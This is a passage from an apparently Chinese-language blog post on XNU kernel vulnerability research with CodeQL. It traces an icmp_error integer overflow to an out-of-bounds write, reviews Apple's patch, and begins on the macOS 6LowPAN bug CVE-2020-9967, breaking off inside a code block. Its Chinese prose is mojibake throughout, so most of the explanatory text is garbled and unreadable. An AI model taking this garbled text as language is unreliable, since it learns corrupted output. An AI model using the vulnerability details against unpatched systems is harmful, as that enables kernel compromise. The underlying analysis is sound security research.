Sourcegraph</a></p><p>çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªcopyæ•°æ®çš„æ—¶å€™æ²¡æœ‰å¯¹è¾¹ç•Œè¿›è¡Œæ£€æŸ¥çš„â€œç®€å•çš„â€œæ¼æ´ï¼Œä½†æ˜¯Ian beerç»™ä½œè€…é‚®ä»¶è§£é‡Šäº†root casueï¼Œè¿™ä¸ªæ¼æ´å‘ç”Ÿçš„æœ¬è´¨åŸå› å¹¶ä¸æ˜¯è¿™ä¸ªåœ°æ–¹ã€‚</p><p>é¦–å…ˆçœ‹å‡ºç°æ¼æ´çš„å‡½æ•°ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Generate an error packet of <span class="built_in">type</span> error</span><br><span class="line"> * <span class="keyword">in</span> response to bad packet ip.</span><br><span class="line"> */</span><br><span class="line">void</span><br><span class="line">icmp_error(</span><br><span class="line">    struct mbuf *n,</span><br><span class="line">    int <span class="built_in">type</span>,</span><br><span class="line">    int code,</span><br><span class="line">    u_int32_t dest,</span><br><span class="line">    u_int32_t nextmtu)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ˜¯å¤„ç†â€œæœ‰é—®é¢˜çš„IPåŒ…â€çš„ï¼Œè¿”å›ä¸€ä¸ªâ€œerror packetâ€ç»™å‘é€è€…ï¼Œç›¸å½“äºï¼šå‘ç°å‘è¿‡æ¥çš„IPåŒ…æœ‰é—®é¢˜ä¹‹åï¼Œç”Ÿæˆä¸€ä¸ªé”™è¯¯ä¿¡æ¯è¿”å›ç»™å‘é€è€…ã€‚</p><p>ä¸Šé¢çš„copyå‡½æ•°æ˜¯å¤åˆ¶åŸæœ¬IPåŒ…åŒ…å¤´çš„ä¿¡æ¯å¤åˆ¶åˆ°è¿”å›åŒ…ä¸­ï¼Œå‡ºç°äº†é—®é¢˜ã€‚æ ¹æ®Ian beerçš„è§£é‡Šï¼š</p><p>æ¼æ´å®é™…å‘ç”Ÿåœ¨æ›´æ—©çš„åœ°æ–¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icp-&gt;icmp_type = <span class="built_in">type</span>;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±è¦æŠŠè¿™ä¸ªå‡½æ•°ä»å¤´å¼€å§‹åˆ†æä¸€ä¸‹äº†ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ï¼šæœ‰é—®é¢˜çš„æ•°æ®åŒ…åœ¨å“ªé‡Œè¿›æ¥çš„ï¼Œåœ¨å“ªé‡Œè¢«å¤„ç†çš„ï¼Œæœ€ç»ˆæ€ä¹ˆèµ°åˆ°copyçš„é€»è¾‘çš„ã€‚</p><p>æºå¤´ï¼š <code>struct mbuf *n</code>   è¡¨ç¤ºæœ‰é—®é¢˜çš„æ•°æ®åŒ…ï¼ˆincoming packet)ï¼Œä¸‹é¢è´´ä¸€ä¸‹ <code>mbuf</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The mbuf object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_hdr</span> <span class="title">m_hdr</span>;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pkthdr</span> <span class="title">MH_pkthdr</span>;</span>    <span class="comment">/* M_PKTHDR set */</span></span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">m_ext</span> <span class="title">MH_ext</span>;</span>    <span class="comment">/* M_EXT set */</span></span><br><span class="line">                <span class="keyword">char</span>    MH_databuf[_MHLEN];</span><br><span class="line">            &#125; MH_dat;</span><br><span class="line">        &#125; MH;</span><br><span class="line">        <span class="keyword">char</span>    M_databuf[_MLEN];        <span class="comment">/* !M_PKTHDR, !M_EXT */</span></span><br><span class="line">    &#125; M_dat;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿”å›çš„æ•°æ®åŒ…ï¼š <code>struct mbuf *m</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (MHLEN &gt; (<span class="keyword">sizeof</span>(struct ip) + ICMP_MINLEN + icmplen))</span><br><span class="line">        m = m_gethdr(M_DONTWAIT, MT_HEADER);    <span class="comment">/* MAC-OK */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR);</span><br></pre></td></tr></table></figure><p>mçš„åˆ†é…å’Œ <code>icmplen</code>  ç›¸å…³ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nlen = m_length(n);</span><br><span class="line">...</span><br><span class="line">icmplen = <span class="built_in">min</span>(oiphlen + icmpelen, <span class="built_in">min</span>(nlen, oip-&gt;ip_len));</span><br></pre></td></tr></table></figure><p>å¤„ç†ï¼š <code>m-&gt;m_len = icmplen + ICMP_MINLEN;</code></p><p>è¿™é‡Œçœ‹èµ·æ¥è¿˜æ²¡æœ‰é—®é¢˜ï¼Œè®¡ç®—è¿”å›åŒ…mçš„é•¿åº¦ï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MH_ALIGN(m, m-&gt;m_len); <span class="comment">// å®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å±•å¼€ä¹‹åï¼š</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * As above, for mbufs allocated with m_gethdr/MGETHDR</span></span><br><span class="line"><span class="comment"> * or initialized by M_COPY_PKTHDR.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MH_ALIGN(m, len)                        \</span></span><br><span class="line"><span class="keyword">do</span> &#123;                                    \</span><br><span class="line">    (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (<span class="keyword">sizeof</span> (<span class="keyword">long</span>) - <span class="number">1</span>);        \</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå®å¹¶æ²¡æœ‰æ£€æŸ¥ MHLEN å’Œ len çš„å¤§å°å…³ç³»ï¼Œè¿™é‡Œæ˜¯æœ‰æ•´æ•°æº¢å‡ºçš„ã€‚</p><p>åœ¨è¿™ä¸ªåœºæ™¯é‡Œï¼Œ <code>MHLEN</code> æ˜¯ 88ï¼Œ lenæ˜¯ mâ†’m_lenï¼Œä¹Ÿå°±æ˜¯ <code>icmplen + ICMP_MINLEN;</code> ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ <code>icmplen</code> å¤§äº80ï¼Œè¿™é‡Œå°±å¯ä»¥è§¦å‘æ•´æ•°æº¢å‡ºï¼Œ m_data æŒ‡å‘äº†å…¶ä»–ä½ç½®ã€‚</p><p>éšåä½¿ç”¨åˆ°è¿™ä¸ª <code>å·²ç»æ•´æ•°æº¢å‡º</code> çš„é•¿åº¦çš„åœ°æ–¹ï¼Œå¹¶ä¸æ˜¯copyçš„é€»è¾‘ï¼Œè€Œæ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icp = mtod(m, struct icmp *);</span><br><span class="line">icp-&gt;icmp_type = type; <span class="comment">// oob write here</span></span><br></pre></td></tr></table></figure><p><code>mtod</code> åªæ˜¯è¿”å›äº† <code>mbuf</code> çš„ data æŒ‡é’ˆ</p><p>å®ä¸€æ­¥ä¸€æ­¥å±•å¼€ä¹‹åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    mtod(m, t)    ((t)m_mtod(m))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">m_mtod(struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (MTOD(m, <span class="keyword">void</span> *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macro version of mtod.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MTOD(m, t)    ((t)((m)-&gt;m_data))</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„è¿‡ç¨‹ä¹‹åï¼ŒicpæŒ‡é’ˆæœ¬æ¥æ˜¯æŒ‡å‘ <code>m_buf</code>çš„æ•°æ®éƒ¨åˆ†</p><p>ä½†æ˜¯æ•´æ•°æº¢å‡ºä¹‹åï¼Œ<code>mâ†’m_data</code> å¢åŠ äº†ä¸€ä¸ªå¾ˆå¤§çš„å€¼(&lt;4GB)ï¼Œæœ€ç»ˆåœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icp-&gt;</span><br><span class="line">icmp_type = type;</span><br></pre></td></tr></table></figure><p>å°±å‘ç”Ÿäº†è¶Šè§£å†™ï¼Œ<code>root case</code> åˆ†æå®Œæ¯•ã€‚</p><h4 id="about-PATCH"><a href="#about-PATCH" class="headerlink" title="about PATCH"></a>about PATCH</h4><p>å…ˆè¯´ä¸ªäººç†è§£ï¼Œç›´æ¥å¯¹ incoming packetçš„ icmplen åšæ£€æŸ¥ï¼Œä½¿å¾—è¿™ä¸ªé•¿åº¦å¿…é¡»æ˜¯åœ¨åˆæ³•èŒƒå›´å†…ï¼ˆæ ¹æ®åŒ…ç»“æ„æ¥è®¡ç®—ï¼‰</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%206.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%206.png"></p><ul><li>é•¿åº¦å¿…é¡» å¤§äºç­‰äº <code>sizeof(struct ip) + ICMP_MINLEN</code></li><li>é•¿åº¦å¿…é¡» å¤§äºç­‰äº <code>oiphlen+ICMP_MINLEN</code></li></ul><p>åé¢è¦è®¡ç®— è¿”å›åŒ…é•¿åº¦çš„æ—¶å€™:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%207.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%207.png"></p><p>æ‰€ä»¥è¿™é‡Œå–åˆ°çš„ä¸€å®šæ˜¯ä¸€ä¸ªåˆæ³•çš„å€¼ã€‚</p><p>å†çœ‹åç»­æ ¹æ®é•¿åº¦ï¼Œæ‹·è´æ•°æ®çš„é€»è¾‘ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%208.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%208.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icmplen = <span class="built_in">min</span>(icmplen, M_TRAILINGSPACE(m) -</span><br><span class="line">        <span class="keyword">sizeof</span>(struct ip) - ICMP_MINLEN);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé•¿åº¦æ˜¯ç»è¿‡è®¡ç®—çš„ï¼ŒæŠŠä¸ºm dataéƒ¨åˆ†åˆ†é…çš„ç©ºé—´å¤§å°è€ƒè™‘äº†è¿›å»ï¼Œè¿™æ ·ä¿è¯æ‹·è´æ•°æ®çš„é•¿åº¦æ˜¯åˆæ³•çš„ã€‚</p><p>è‡³æ­¤è¿™ä¸ªæ´ç®—æ˜¯ä¿®çš„æ²¡é—®é¢˜äº†ã€‚</p><h3 id="Apple-macOS-6LowPAN-Vulnerability"><a href="#Apple-macOS-6LowPAN-Vulnerability" class="headerlink" title="Apple macOS 6LowPAN Vulnerability"></a>Apple macOS 6LowPAN Vulnerability</h3><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p><h4 id="Setup-env-1"><a href="#Setup-env-1" class="headerlink" title="Setup env"></a>Setup env</h4><p>æœ‰æ¼æ´çš„ç‰ˆæœ¬ <code>10.15.4</code> ä¸ºç›®æ ‡ï¼Œè‹¹æœä¹Ÿåœ¨Big Suré‡Œåšäº†ä¿®å¤ï¼Œè¿™äº›æ´å½±å“èŒƒå›´è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œä¸ºäº†æ–¹ä¾¿èµ·è§ä½¿ç”¨ <code>10.15.4</code> ã€‚ (â‰¤ 10.15.4)</p><p><a href="https://kernelshaman.blogspot.com/2020/09/building-xnu-for-macos-catalina-1015x.html">Building XNU for macOS Catalina 10.15.x</a></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%209.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%209.png"></p><p>éšåæµ‹è¯•ä¸€ä¸‹æ•°æ®åº“å¯ç”¨å³å¯ã€‚</p><h4 id="CodeQL-query"><a href="#CodeQL-query" class="headerlink" title="CodeQL query"></a>CodeQL query</h4><p>åœ¨è¿™ä¸ªç‰ˆæœ¬çš„xnuä»£ç (6153.101.6)ï¼Œbcopyåœ¨xnuä¸­è¢«å¤§é‡ä½¿ç”¨ï¼Œä½†æ˜¯å®ç°æ¢æˆäº† <code>builtin___memmove_chk</code> ï¼Œæ‰€ä»¥åªéœ€è¦æŠŠ ä¹‹å‰æ±¡ç‚¹è¿½è¸ªçš„ queryçš„sinkæ›¿æ¢ä¸€ä¸‹å³å¯ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%2010.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2010.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%2011.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2011.png"></p><p>èƒ½è¦†ç›–åˆ°è¿™äº›é—®é¢˜ï¼Œä½†æ˜¯éœ€è¦æŒ¨ä¸ªç»“æœå®¡è®¡ï¼Œç„¶åæ„é€ pocæ‰è¡Œã€‚</p><h4 id="About-6LowPAN"><a href="#About-6LowPAN" class="headerlink" title="About 6LowPAN"></a>About <code>6LowPAN</code></h4><p><code>6LowPAN</code> åœ¨ macOS10.15å¼•å…¥ï¼Œå…¨ç§°æ˜¯: <code>IPv6 over Low-Power Wireless Persona Area Networks</code> </p><p>6LoWPANæ˜¯ä¸€ç§åŸºäºIPv6çš„ä½é€Ÿæ— çº¿ä¸ªåŸŸç½‘æ ‡å‡†ï¼Œå³IPv6 over IEEE 802.15.4ã€‚è®©æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥ç”¨IPv6åœ°å€è”ç½‘ã€‚è¿™å…è®¸èŠ‚ç‚¹ä½¿ç”¨å¼€æ”¾æ ‡å‡†ç›´æ¥ä¸Internetè¿æ¥ã€‚å³ä½¿åœ¨æœ€å°çš„èµ„æºå—é™è®¾å¤‡ä¸Šä¹Ÿå¯ä»¥åº”ç”¨Internetåè®®ï¼Œå¹¶ä¸”å¤„ç†èƒ½åŠ›æœ‰é™çš„ä½åŠŸç‡è®¾å¤‡åº”è¯¥èƒ½å¤Ÿå‚ä¸ç‰©è”ç½‘ã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/152457583">å¹¿åŸŸæ— çº¿ç‰©è”ç½‘åŠ6LoWPANä»‹ç»</a></p><p><a href="https://tools.ietf.org/html/rfc4919">RFC 4919 - IPv6 over Low-Power Wireless Personal Area Networks (6LoWPANs): Overview, Assumptions, Problem Statement, and Goals</a></p><p>ï¼ˆççŒœä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿æ˜¯å¯¹åº”10.15é‡Œå¼•å…¥çš„é‚£ä¸ª â€œä»¥<em>æŸ¥æ‰¾</em>æœªè”ç½‘Mac çš„åŠŸèƒ½â€œ ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frame802154.c â†’ 802.15.4å¸§åˆ›å»ºå’Œè§£æé€»è¾‘</span><br><span class="line"></span><br><span class="line">if_6lowpan.c â†’ 6LowPAN network interface</span><br><span class="line"></span><br><span class="line">sixlowpan.c â†’ 6LowPAN å‹ç¼©&#x2F;è§£å‹é€»è¾‘</span><br></pre></td></tr></table></figure><ul><li>IEEE 802.15.4å¸§æ ¼å¼</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%2012.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2012.png"></p><p>frame control å­—æ®µï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%2013.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2013.png"></p><p>IPv6æŠ¥æ–‡å¿…é¡»æ‰¿è½½åœ¨æ•°æ®å¸§ä¸Šã€‚è§£æå¸§çš„æ—¶å€™ï¼Œé¦–å…ˆç¡®å®šheaderï¼Œéšåè§£æ payloadéƒ¨åˆ†ã€‚</p><ul><li>LoWPAN Payload</li></ul><p>ç”±äºå…¨IPv6æŠ¥æ–‡ä¸ç¬¦åˆieee802.15.4å¸§çš„è¦æ±‚ï¼ŒIPv6éœ€è¦æä¾›é€‚é…å±‚æ¥æ»¡è¶³MTUçš„æœ€å°è¦æ±‚ã€‚è¯¥æ ‡å‡†è¿˜å®šä¹‰äº†æŠ¥å¤´å‹ç¼©çš„ä½¿ç”¨ï¼Œå› ä¸ºé¢„è®¡å¤§å¤šæ•°åº”ç”¨ç¨‹åºå°†ä½¿ç”¨IEEE 802.15.4ä¸Šçš„IPã€‚</p><p>LoWPAN payload (e.g., an IPv6 packet) éµå¾ªä¸Šé¢çš„æè¿°ï¼›IPv6 å¤´æœ‰40å­—èŠ‚ã€‚</p><p>åœ¨åˆå§‹æ ‡å‡†ä¸­ï¼Œå®šä¹‰äº† <code>LoWPAN_HC1</code> å‹ç¼©IPv6æ•°æ®æŠ¥ã€‚è¿™æ„å‘³ç€6LowPANçš„payload åœ¨æ¥æ”¶æ—¶è¢«å‹ç¼©ã€‚</p><ul><li>Data Link Layer Dispatching æ•°æ®é“¾è·¯å±‚åˆ†å‘</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%2014.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2014.png"></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä»¥å¤ªç½‘æ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…å°†ç”±demuxå‡½æ•°å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">ether_demux(<span class="keyword">ifnet_t</span> ifp, <span class="keyword">mbuf_t</span> m, <span class="keyword">char</span> *frame_header,</span><br><span class="line">    <span class="keyword">protocol_family_t</span> *protocol_family)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_header</span> *<span class="title">eh</span> = (<span class="title">struct</span> <span class="title">ether_header</span> *)(<span class="title">void</span> *)<span class="title">frame_header</span>;</span></span><br><span class="line">    u_short  ether_type = eh-&gt;ether_type;</span><br><span class="line">    <span class="keyword">u_int16_t</span> type;</span><br><span class="line">    <span class="keyword">u_int8_t</span> *data;</span><br><span class="line">    <span class="keyword">u_int32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_desc_blk_str</span> *<span class="title">desc_blk</span> =</span></span><br><span class="line"><span class="class">        (<span class="title">struct</span> <span class="title">ether_desc_blk_str</span> *)<span class="title">ifp</span>-&gt;<span class="title">if_family_cookie</span>;</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> maxd = desc_blk ? desc_blk-&gt;n_max_used : <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">en_desc</span>  *<span class="title">ed</span> = <span class="title">desc_blk</span> ? <span class="title">desc_blk</span>-&gt;<span class="title">block_ptr</span> :</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Check for broadcast */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(etherbroadcastaddr, eh-&gt;ether_dhost) == <span class="number">0</span>) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_BCAST;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m-&gt;m_flags |= M_MCAST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m-&gt;m_flags &amp; M_HASFCS) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If the M_HASFCS is set by the driver we want to make sure</span></span><br><span class="line"><span class="comment">         * that we strip off the trailing FCS data before handing it</span></span><br><span class="line"><span class="comment">         * up the stack.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        m_adj(m, -ETHER_CRC_LEN);</span><br><span class="line">        m-&gt;m_flags &amp;= ~M_HASFCS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * When the driver is put into promiscuous mode we may receive</span></span><br><span class="line"><span class="comment">         * unicast frames that are not intended for our interfaces.</span></span><br><span class="line"><span class="comment">         * They are marked here as being promiscuous so the caller may</span></span><br><span class="line"><span class="comment">         * dispose of them after passing the packets to any interface</span></span><br><span class="line"><span class="comment">         * filters.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(eh-&gt;ether_dhost, IF_LLADDR(ifp))) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_PROMISC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for IEEE 802.15.4 */</span></span><br><span class="line">    <span class="keyword">if</span> (ether_type == htons(ETHERTYPE_IEEE802154)) &#123;</span><br><span class="line">        *protocol_family = PF_802154;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä»¥å¤ªæŠ¥å¤´ä¸­çš„ <code>ether_type</code> æ˜¯ <code>ETHERTYPE_IEEE802154</code> , é‚£ä¹ˆè¯¥å‡½æ•°ä¼šå°†åè®®æ—è®¾ç½®ä¸ºPF 802154ã€‚</p><p>ç°åœ¨ï¼Œåœ¨é»˜è®¤é…ç½®ä¸­ï¼Œè¿™ä¸ªåè®®æ—å°†ä¸ä¼šè¢«å¤„ç†ï¼Œé™¤éé…ç½®äº†6lowpanæ¥å£ï¼Œè¿™å°†å¯¼è‡´ä»¥ä¸‹ä»£ç æ³¨å†Œä¸€ä¸ªå‡½æ•° <code>sixlowpan_input</code> ï¼Œå½“å¤„ç†ä¸€ä¸ª802.15.4å¸§æ—¶å°†è¢«è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function: sixlowpan_attach_protocol</span></span><br><span class="line"><span class="comment"> * Purpose:</span></span><br><span class="line"><span class="comment"> *   Attach a DLIL protocol to the interface</span></span><br><span class="line"><span class="comment"> *     The ethernet demux actually special cases 802.15.4.</span></span><br><span class="line"><span class="comment"> *     The demux here isn't used. The demux will return PF_802154 for the</span></span><br><span class="line"><span class="comment"> *     appropriate packets and our sixlowpan_input function will be called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sixlowpan_attach_protocol(struct ifnet *ifp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span>     error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifnet_attach_proto_param</span> <span class="title">reg</span>;</span></span><br><span class="line"></span><br><span class="line">    bzero(&amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.input            = sixlowpan_input;</span><br><span class="line">    reg.detached         = sixlowpan_detached;</span><br><span class="line">    error = ifnet_attach_protocol(ifp, PF_802154, &amp;reg);</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s(%s%d) ifnet_attach_protocol failed, %d\n"</span>,</span><br><span class="line">            __func__, ifnet_name(ifp), ifnet_unit(ifp), error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h4><p>è°ƒç”¨sixlowpan_inputå‡½æ•°æ¥è§£å°è£…802.15.4æ•°æ®å¸§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 